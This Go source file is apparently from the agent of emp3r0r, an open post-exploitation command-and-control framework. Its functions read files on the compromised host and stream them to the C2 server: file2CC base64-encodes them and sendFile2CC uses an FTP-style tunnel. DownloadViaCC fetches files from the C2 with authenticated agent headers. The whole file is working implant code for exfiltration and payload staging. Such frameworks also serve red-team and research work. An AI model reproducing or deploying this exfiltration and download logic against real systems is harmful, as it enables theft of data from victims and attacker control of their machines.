package agent

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"time"

	"github.com/cavaliergopher/grab/v3"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// send local file to CC, Deprecated
func file2CC(filepath string, offset int64) (checksum string, err error) {
	// open and read the target file
	f, err := os.Open(filepath)
	if err != nil {
		return
	}
	total := util.FileSize(filepath)
	bytes := make([]byte, total-offset)
	_, err = f.ReadAt(bytes, offset)
	if err != nil {
		return
	}
	checksum = tun.SHA256SumRaw(bytes)

	// base64 encode
	payload := base64.StdEncoding.EncodeToString(bytes)

	magic_str := emp3r0r_data.MagicString
	fileData := emp3r0r_data.MsgTunData{
		Payload: "FILE" + magic_str + filepath + magic_str + payload,
		Tag:     RuntimeConfig.AgentTag,
	}

	// send
	return checksum, Send2CC(&fileData)
}

// DownloadViaCC download via EmpHTTPClient
// if path is empty, return []data instead
func DownloadViaCC(file_to_download, path string) (data []byte, err error) {
	url := fmt.Sprintf("%s%s/%s?file_to_download=%s",
		emp3r0r_data.CCAddress, tun.FileAPI, url.QueryEscape(RuntimeConfig.AgentTag), url.QueryEscape(file_to_download))
	log.Printf("DownloadViaCC is downloading from %s to %s", url, path)
	retData := false
	if path == "" {
		retData = true
		log.Printf("No path specified, will return []byte")
	}
	lock := fmt.Sprintf("%s.downloading", path)
	if util.IsFileExist(lock) {
		err = fmt.Errorf("%s already being downloaded", url)
		return
	}

	// create file.downloading to prevent racing downloads
	if !retData {
		os.Create(lock)
	}

	// use EmpHTTPClient if no path specified
	if retData {
		client := tun.EmpHTTPClient(emp3r0r_data.CCAddress, RuntimeConfig.C2TransportProxy)
		if client == nil {
			err = fmt.Errorf("failed to initialize HTTP client")
			return
		}
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			err = fmt.Errorf("DownloadViaCC HTTP GET failed to create request: %v", err)
			return nil, err
		}
		req.Header.Set("AgentUUID", RuntimeConfig.AgentUUID)
		req.Header.Set("AgentUUIDSig", RuntimeConfig.AgentUUIDSig)
		resp, err := client.Do(req)
		if err != nil {
			err = fmt.Errorf("DownloadViaCC HTTP GET: %v", err)
			return nil, err
		}
		if resp.StatusCode != 200 {
			err = fmt.Errorf("DownloadViaCC HTTP GET: %s", resp.Status)
			return nil, err
		}
		data, err := io.ReadAll(resp.Body)
		if err != nil {
			err = fmt.Errorf("DownloadViaCC read body: %v", err)
			return nil, err
		}
		return data, nil
	}

	// use grab
	client := grab.NewClient()
	client.HTTPClient = tun.EmpHTTPClient(emp3r0r_data.CCAddress, RuntimeConfig.C2TransportProxy)
	if client.HTTPClient == nil {
		err = fmt.Errorf("failed to initialize HTTP client")
		return
	}

	req, err := grab.NewRequest(path, url)
	if err != nil {
		err = fmt.Errorf("Create grab request: %v", err)
		return
	}
	req.HTTPRequest.Header.Set("AgentUUID", RuntimeConfig.AgentUUID)
	req.HTTPRequest.Header.Set("AgentUUIDSig", RuntimeConfig.AgentUUIDSig)
	resp := client.Do(req)

	// progress
	t := time.NewTicker(10 * time.Second)
	defer func() {
		t.Stop()
		if !retData && !util.IsExist(path) {
			data = nil
			err = fmt.Errorf("Target file '%s' does not exist, downloading from CC may have failed", path)
		}
		os.RemoveAll(lock)
	}()
	for !resp.IsComplete() {
		select {
		case <-resp.Done:
			err = resp.Err()
			if err != nil {
				err = fmt.Errorf("DownloadViaCC finished with error: %v", err)
				log.Print(err)
				return
			}
			log.Printf("DownloadViaCC: saved %s to %s (%d bytes)", url, path, resp.Size())
			return
		case <-t.C:
			log.Printf("%.02f%% complete\n", resp.Progress()*100)
		}
	}

	return
}

// sendFile2CC send file to CC, with buffering
// using FTP API
func sendFile2CC(filepath string, offset int64, token string) (err error) {
	log.Printf("Sending %s to CC, offset=%d", filepath, offset)
	// open and read the target file
	f, err := os.Open(filepath)
	if err != nil {
		err = fmt.Errorf("sendFile2CC: failed to open %s: %v", filepath, err)
		return
	}
	defer f.Close()

	// seek offset
	_, err = f.Seek(offset, 0)
	if err != nil {
		err = fmt.Errorf("sendFile2CC: failed to seek %d in %s: %v", offset, filepath, err)
		return
	}

	// connect
	url := fmt.Sprintf("%s%s/%s",
		emp3r0r_data.CCAddress,
		tun.FTPAPI,
		token)
	conn, _, _, err := ConnectCC(url)
	log.Printf("sendFile2CC: connection: %s", url)
	if err != nil {
		err = fmt.Errorf("sendFile2CC: connection failed: %v", err)
		return
	}
	// defer cancel()
	defer conn.Close()

	freader := bufio.NewReader(f)
	n, err := io.Copy(conn, freader)
	if err != nil {
		log.Printf("sendFile2CC failed, %d bytes transfered: %v", n, err)
	}
	return
}
